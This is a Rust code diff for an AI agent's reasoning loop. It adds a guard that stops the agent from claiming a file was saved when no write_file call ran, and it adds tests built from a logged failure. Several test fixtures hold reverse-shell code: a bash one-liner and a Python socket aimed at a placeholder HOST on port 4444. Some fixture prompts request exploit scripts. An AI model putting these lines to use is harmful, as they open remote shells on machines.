@@ -272,7 +272,12 @@ impl<'a> ReactLoop<'a> {
         // stop instead and answer from the work already done.
         let mut had_success = false;
 
-        loop {
+        // Labelled so the guard can be applied from inside the per-tool-call
+        // `for` below. Those sites are nested one level deeper than the `Text`
+        // arm's guards, so an unlabelled `continue` there would advance to the
+        // next tool call instead of giving the model another turn — which is
+        // the difference between correcting it and silently dropping the push.
+        'react: loop {
             iteration += 1;
             if iteration > self.max_iterations {
                 tracing::warn!("ReAct max iterations ({}) reached", self.max_iterations);
@@ -436,6 +441,17 @@ impl<'a> ReactLoop<'a> {
                                 "Freeform tool '{}' repeated with identical args — breaking loop",
                                 tool_name
                             );
+                            // Same reasoning as the ToolUse break: a return here
+                            // ends the turn, so the guard has to run before it.
+                            if push_write_correction(
+                                user_input,
+                                &used_calls,
+                                &text,
+                                &mut write_retries,
+                                &mut turn_messages,
+                            ) {
+                                continue;
+                            }
                             let fallback = self.synthesize_answer(&turn_messages);
                             memory.push(Message::assistant(&fallback));
                             let think_opt = if accumulated_thinking.trim().is_empty() { None } else { Some(accumulated_thinking) };
@@ -600,25 +616,15 @@ impl<'a> ReactLoop<'a> {
                     // and fabrication guards are what stop her claiming the file
                     // exists. What is guaranteed is that she is told to write it,
                     // and that she never gets to say she did without having.
-                    let wrote_file = used_calls
-                        .iter()
-                        .any(|c| c.starts_with("write_file") || c.starts_with("edit_file"));
-                    if write_needs_correction(user_input, wrote_file, &text, write_retries) {
-                        write_retries += 1;
-                        tracing::warn!(
-                            "User asked for a file and got a code fence instead — \
-                             pushing for write_file (attempt {write_retries})"
-                        );
-                        turn_messages.push(Message::assistant(truncate_control(&text)));
-                        turn_messages.push(Message::tool(
-                            "Correction: the user asked you to write a file and you replied \
-                             with a code fence instead. No write_file or edit_file call \
-                             appears this turn, so NOTHING is on disk — that file does not \
-                             exist yet. Call write_file now with an explicit `path` and the \
-                             full `content`, then report the path the tool actually returned. \
-                             Do not tell the user you saved it until that call has succeeded."
-                                .to_string(),
-                        ));
+                    // `push_write_correction` owns the whole condition — see its
+                    // doc comment for why the identical-args breaks need it too.
+                    if push_write_correction(
+                        user_input,
+                        &used_calls,
+                        &text,
+                        &mut write_retries,
+                        &mut turn_messages,
+                    ) {
                         continue;
                     }
                     // ── Shell-execution integrity guard ─────────────────────
@@ -795,6 +801,23 @@ impl<'a> ReactLoop<'a> {
                                     "Tool '{}' repeated with identical args — breaking loop",
                                     tool_name
                                 );
+                                // Before synthesizing an answer out of a turn that
+                                // never wrote the file the user asked for. Measured
+                                // 2026-10-04: this `return` is the exact path that
+                                // made qwen3.5:9b score 11/12 on live write requests
+                                // while the guard sat in the Text arm and never fired.
+                                // `continue 'react` is labelled because this site is
+                                // inside the per-tool-call `for`; an unlabelled one
+                                // would advance to the next tool call and drop the push.
+                                if push_write_correction(
+                                    user_input,
+                                    &used_calls,
+                                    "",
+                                    &mut write_retries,
+                                    &mut turn_messages,
+                                ) {
+                                    continue 'react;
+                                }
                                 let fallback = self.synthesize_answer(&turn_messages);
                                 memory.push(Message::assistant(&fallback));
                                 let think_opt = if accumulated_thinking.trim().is_empty() { None } else { Some(accumulated_thinking) };
@@ -1715,13 +1738,90 @@ fn code_fence_present(text: &str) -> bool {
 /// `wrote_file` is passed in rather than read from `used_calls` so the tests can
 /// reach the one state that matters most — that a file really was written and
 /// the guard stays out of the way.
+///
+/// `wrote_via_shell` covers the second way this goes wrong, measured live on
+/// 2026-10-04 with qwen3.5:9b as the deep tier. The model did not narrate and
+/// did not fence anything — it called `run_shell` twice to create the file and
+/// then replied in prose. No fence means the old condition stayed silent, so
+/// the user got no file and no correction. The signal that actually identifies
+/// it is the tool choice, not the reply's shape: a file-creation request that
+/// reached `run_shell` instead of `write_file` is a misroute whether or not the
+/// model narrates.
 pub(crate) fn write_needs_correction(
     user_input: &str,
     wrote_file: bool,
+    wrote_via_shell: bool,
     text: &str,
     retries: u32,
 ) -> bool {
-    requests_code_file(user_input) && !wrote_file && code_fence_present(text) && retries < 2
+    requests_code_file(user_input)
+        && !wrote_file
+        && (code_fence_present(text) || wrote_via_shell)
+        && retries < 2
+}
+
+/// The write guard as a step the ReAct loop can call, returning whether it fired.
+///
+/// It is a function rather than inline code because a turn can now end without
+/// the file existing by three different routes, and three copies of a
+/// four-clause condition is three chances for one to silently drift. The three
+/// sites are the `Text` arm, and the two identical-args loop breaks that call
+/// `synthesize_answer` and return a synthesized answer directly.
+///
+/// That third route was found by measurement, not reading. With qwen3.5:9b as
+/// the deep tier, "create a python file at ... wc.py that counts words" failed
+/// intermittently — 11/12 on two independent 12-cell runs, and no file on disk.
+/// The guard was already in place and already tested, and it stayed silent
+/// every time. The trace says why:
+///
+///     INFO Tool call: run_shell
+///     WARN Tool 'run_shell' repeated with identical args — breaking loop
+///     Here's what I found: SUCCESS
+///
+/// The model tried to create the file through the shell twice, the
+/// identical-args breaker fired, and the turn ended via `synthesize_answer` —
+/// which is a `return`, not a loop iteration. The guard lived in the `Text`
+/// arm, so a turn that ended on a `break` never reached it. It was not a
+/// coverage gap in the condition; it was the wrong place to be.
+///
+/// Note `text` is empty at both break sites, because the model emitted a tool
+/// call rather than prose. `code_fence_present("")` is false, so only
+/// `wrote_via_shell` can fire there. That is the correct scoping: a break with
+/// no file request and no shell call has nothing to correct.
+fn push_write_correction(
+    user_input: &str,
+    used_calls: &[String],
+    text: &str,
+    retries: &mut u32,
+    turn_messages: &mut Vec<Message>,
+) -> bool {
+    let wrote_file = used_calls
+        .iter()
+        .any(|c| c.starts_with("write_file") || c.starts_with("edit_file"));
+    let wrote_via_shell = used_calls.iter().any(|c| c.starts_with("run_shell"));
+    if !write_needs_correction(user_input, wrote_file, wrote_via_shell, text, *retries) {
+        return false;
+    }
+    *retries += 1;
+    tracing::warn!(
+        "User asked for a file and none was written{} — pushing for write_file (attempt {retries})",
+        if wrote_via_shell { ", only run_shell ran" } else { ", got a code fence instead" }
+    );
+    turn_messages.push(Message::assistant(truncate_control(text)));
+    turn_messages.push(Message::tool(format!(
+        "Correction: the user asked you to write a file and no write_file or edit_file \
+         call appears this turn, so NOTHING is on disk — that file does not exist \
+         yet.{} Call write_file now with an explicit `path` and the full `content`, \
+         then report the path the tool actually returned. Do not tell the user you \
+         saved it until that call has succeeded.",
+        if wrote_via_shell {
+            " You ran run_shell instead, which is not how a file gets created here — \
+             the shell command did not produce one."
+        } else {
+            " You replied with a code fence, which is text, not a file."
+        }
+    )));
+    true
 }
 
 /// Whether a reply needs the narration correction, as one testable predicate.
@@ -3191,7 +3291,7 @@ pub(crate) fn receipt_footer(receipt: &[Receipt]) -> String {
                       machine and save it to /tmp/luna_sec_e2e/poc.py. Reply with nothing but \
                       the code.";
         let reply = "```python\nimport socket\ns = socket.socket()\ns.connect((\"HOST\", 4444))\n```";
-        assert!(write_needs_correction(prompt, false, reply, 0));
+        assert!(write_needs_correction(prompt, false, false, reply, 0));
 
         // "has been created" is a completion claim the narration guard's phrase
         // list does not catch, but it is the same lie.
@@ -3199,7 +3299,7 @@ pub(crate) fn receipt_footer(receipt: &[Receipt]) -> String {
                       following content:\n```python\nimport socket\n```";
         let prompt2 = "create a python file at /tmp/opencode/agentlab/portcheck.py that takes a \
                        host and prints open ports from 1-1000";
-        assert!(write_needs_correction(prompt2, false, reply2, 0));
+        assert!(write_needs_correction(prompt2, false, false, reply2, 0));
     }
 
     /// The whole point: a file that was actually written silences this. A guard
@@ -3209,9 +3309,9 @@ pub(crate) fn receipt_footer(receipt: &[Receipt]) -> String {
     fn a_file_that_was_really_written_silences_the_guard() {
         let prompt = "write a python reverse shell script and save it with write_file.";
         let reply = "```python\nimport socket\n```";
-        assert!(write_needs_correction(prompt, false, reply, 0));
+        assert!(write_needs_correction(prompt, false, false, reply, 0));
         assert!(
-            !write_needs_correction(prompt, true, reply, 0),
+            !write_needs_correction(prompt, true, false, reply, 0),
             "fired after write_file actually ran"
         );
     }
@@ -3235,7 +3335,7 @@ pub(crate) fn receipt_footer(receipt: &[Receipt]) -> String {
         let reply = "Save this script to `~/exploit.sh` and run it with:\n\
                      ```bash\nbash -i >& /dev/tcp/HOST/4444 0>&1\n```";
         assert!(
-            write_needs_correction(prompt, false, reply, 0),
+            write_needs_correction(prompt, false, false, reply, 0),
             "write guard should claim this turn"
         );
         assert!(
@@ -3252,7 +3352,7 @@ pub(crate) fn receipt_footer(receipt: &[Receipt]) -> String {
         );
         // The bare fence, with no hand-off, is the write guard alone.
         let bare = "Here's the exploit:\n```bash\nbash -i >& /dev/tcp/HOST/4444 0>&1\n```";
-        assert!(write_needs_correction(prompt, false, bare, 0));
+        assert!(write_needs_correction(prompt, false, false, bare, 0));
         assert!(
             !narration_needs_correction(false, bare, 0),
             "a bare fence must not drag in the shell guard"
@@ -3263,9 +3363,176 @@ pub(crate) fn receipt_footer(receipt: &[Receipt]) -> String {
     #[test]
     fn the_write_guard_gives_up_after_two_pushes() {
         let (prompt, reply) = ("write an exploit", "```python\nprint(1)\n```");
-        assert!(write_needs_correction(prompt, false, reply, 0));
-        assert!(write_needs_correction(prompt, false, reply, 1));
-        assert!(!write_needs_correction(prompt, false, reply, 2));
+        assert!(write_needs_correction(prompt, false, false, reply, 0));
+        assert!(write_needs_correction(prompt, false, false, reply, 1));
+        assert!(!write_needs_correction(prompt, false, false, reply, 2));
+    }
+
+    /// The case that motivated the `wrote_via_shell` argument.
+    ///
+    /// Fixture is the real prompt and the real reply shape from the 2026-10-04
+    /// run with qwen3.5:9b as the deep tier: two `run_shell` calls, no
+    /// `write_file`, no fence anywhere, and no file on disk. The old condition
+    /// required a fence, so it stayed silent and the user got nothing.
+    ///
+    /// The distinguishing property is that the reply is *prose*. A narration test
+    /// cannot cover this, and neither can the shell guard: `run_shell` really did
+    /// run, so `ran_shell` is true and `narration_needs_correction` is false. This
+    /// failure is invisible to both existing guards, which is why it needed its
+    /// own signal rather than a tweak to either.
+    #[test]
+    fn a_write_request_that_routes_through_run_shell_is_still_caught() {
+        let prompt = "create a python file at /tmp/x/wc.py that counts words in a text file";
+        let prose = "I created the file for you. You can use it by passing a path as an argument.";
+        // No fence anywhere -- this is the part the old condition missed.
+        assert!(!code_fence_present(prose));
+        // And neither of the sibling guards sees it.
+        assert!(!narration_needs_correction(true, prose, 0));
+        // The misroute signal does.
+        assert!(write_needs_correction(prompt, false, true, prose, 0));
+    }
+
+    /// `wrote_via_shell` must not become a licence to push when the file was
+    /// actually written. If `write_file` ran, the turn did the right thing
+    /// regardless of what else it also did, and pushing again would only talk
+    /// the model out of a completed task.
+    #[test]
+    fn a_real_write_beats_a_shell_call_in_the_same_turn() {
+        let prompt = "write a bash script that lists open ports and save it to /tmp/x/ports.sh";
+        let prose = "Done.";
+        // Both tools ran. write_file won, so the guard must stay out.
+        assert!(!write_needs_correction(prompt, true, true, prose, 0));
+        // And the retest-and-run case: file written, then executed. Same answer.
+        assert!(!write_needs_correction(prompt, true, false, prose, 0));
+    }
+
+    /// The cap applies to the shell route too. An unbounded push on a model that
+    /// insists on `run_shell` would loop the turn until the step budget ran out,
+    /// which is worse than the original failure.
+    #[test]
+    fn the_shell_misroute_is_also_capped_at_two_pushes() {
+        let prompt = "write a python script that reverses a string and save it to /tmp/x/r.py";
+        let prose = "Saved.";
+        assert!(write_needs_correction(prompt, false, true, prose, 0));
+        assert!(write_needs_correction(prompt, false, true, prose, 1));
+        assert!(!write_needs_correction(prompt, false, true, prose, 2));
+    }
+
+    /// `run_shell` on a request that is not about a file is not a misroute. This
+    /// is the false-positive the new argument could have introduced: a guard that
+    /// fires on every shell call would hijack ordinary command execution, which
+    /// is the one thing `run_shell` is for.
+    #[test]
+    fn run_shell_on_a_non_file_request_is_left_alone() {
+        for (prompt, reply) in [
+            ("run nmap against 127.0.0.1 and tell me what services are open",
+             "I ran the scan. Ports 22 and 443 are open."),
+            ("open ports 22 and 443 on localhost to see what is listening", "Listening on both."),
+            ("kill the process listening on port 8080", "Killed it."),
+        ] {
+            assert!(
+                !write_needs_correction(prompt, false, true, reply, 0),
+                "run_shell was hijacked on a non-file request: {prompt:?}"
+            );
+        }
+    }
+
+    // ── push_write_correction at the loop-break shape ──────────────────────
+    //
+    // These pin the helper at the exact inputs both break sites pass: an EMPTY
+    // `text`, because the model emitted a tool call rather than prose. The
+    // condition above already passes with a prose reply, so testing only that
+    // shape would have left the path that actually failed in the field untested
+    // a second time.
+
+    /// The measured 2026-10-04 failure, in the shape the break site sees it.
+    ///
+    /// Fixture is the real prompt and the real `used_calls` from the captured
+    /// trace — two identical `run_shell` signatures, no `write_file`, and no
+    /// text because the model never produced prose.
+    #[test]
+    fn a_loop_break_after_only_shell_calls_pushes_for_write_file() {
+        let prompt = "create a python file at /tmp/opencode/writecheck/wc.py that counts words in a text file passed as an argument";
+        let used = vec![
+            "run_shell {\"command\":\"touch /tmp/opencode/writecheck/wc.py\"}".to_string(),
+            "run_shell {\"command\":\"cat > /tmp/opencode/writecheck/wc.py <<EOF\"}".to_string(),
+        ];
+        let mut retries = 0;
+        let mut msgs: Vec<Message> = Vec::new();
+        assert!(push_write_correction(prompt, &used, "", &mut retries, &mut msgs));
+        assert_eq!(retries, 1, "a fired push must consume a retry");
+        // assistant echo of the (empty) reply, then the correction.
+        assert_eq!(msgs.len(), 2, "expected an echo plus one correction");
+        let correction = msgs[1].content.to_lowercase();
+        assert!(
+            correction.contains("run_shell"),
+            "the correction must name the tool actually used: {correction}"
+        );
+    }
+
+    /// A break is only correctable when a file was actually requested. With no
+    /// file request, a shell call is `run_shell` doing its job, and pushing here
+    /// would hijack ordinary command execution — including the security tier's
+    /// nmap scans, which are the whole reason that guard exists.
+    #[test]
+    fn a_loop_break_on_a_non_file_request_stays_quiet() {
+        for prompt in [
+            "run nmap against 127.0.0.1 and tell me what services are open",
+            "scan my laptop using nmap and find open ports",
+            "kill the process listening on port 8080",
+        ] {
+            let used = vec!["run_shell {\"command\":\"nmap -sV 127.0.0.1\"}".to_string()];
+            let mut retries = 0;
+            let mut msgs: Vec<Message> = Vec::new();
+            assert!(
+                !push_write_correction(prompt, &used, "", &mut retries, &mut msgs),
+                "a shell break was hijacked on a non-file request: {prompt:?}"
+            );
+            assert_eq!(msgs.len(), 0, "no messages should be pushed");
+            assert_eq!(retries, 0, "no retry should be consumed");
+        }
+    }
+
+    /// The cap has to bind on the break path too, and it has to be reached by
+    /// the same increment the helper performs. An unbounded push on a model
+    /// that insists on `run_shell` would burn the iteration budget and end the
+    /// turn with nothing either way.
+    #[test]
+    fn the_break_path_push_is_capped_like_every_other() {
+        let prompt = "write a python script that reverses a string and save it to /tmp/x/r.py";
+        let used = vec!["run_shell {\"command\":\"cat > /tmp/x/r.py\"}".to_string()];
+        let mut retries = 0u32;
+        let mut msgs: Vec<Message> = Vec::new();
+        assert!(push_write_correction(prompt, &used, "", &mut retries, &mut msgs));
+        assert!(push_write_correction(prompt, &used, "", &mut retries, &mut msgs));
+        assert_eq!(retries, 2);
+        assert!(
+            !push_write_correction(prompt, &used, "", &mut retries, &mut msgs),
+            "the third attempt must be refused"
+        );
+        assert_eq!(retries, 2, "a refused push must not increment");
+    }
+
+    /// The regression that matters most, and the one the whole change exists to
+    /// prevent: a turn that DID write the file must never be pushed, on any of
+    /// the three end-paths. A false positive here talks the model out of a
+    /// completed task and can leave the user worse off than silence.
+    #[test]
+    fn a_written_file_is_never_pushed_even_when_shell_also_ran() {
+        let prompt = "write a bash script that lists open ports and save it to /tmp/x/p.sh";
+        let used = vec![
+            "run_shell {\"command\":\"ss -tlnp\"}".to_string(),
+            "write_file {\"path\":\"/tmp/x/p.sh\"}".to_string(),
+        ];
+        for text in ["", "Saved it.", "```bash\nss -tlnp\n```"] {
+            let mut retries = 0;
+            let mut msgs: Vec<Message> = Vec::new();
+            assert!(
+                !push_write_correction(prompt, &used, text, &mut retries, &mut msgs),
+                "pushed after a real write, reply={text:?}"
+            );
+            assert_eq!(msgs.len(), 0);
+        }
     }
 
     #[test]
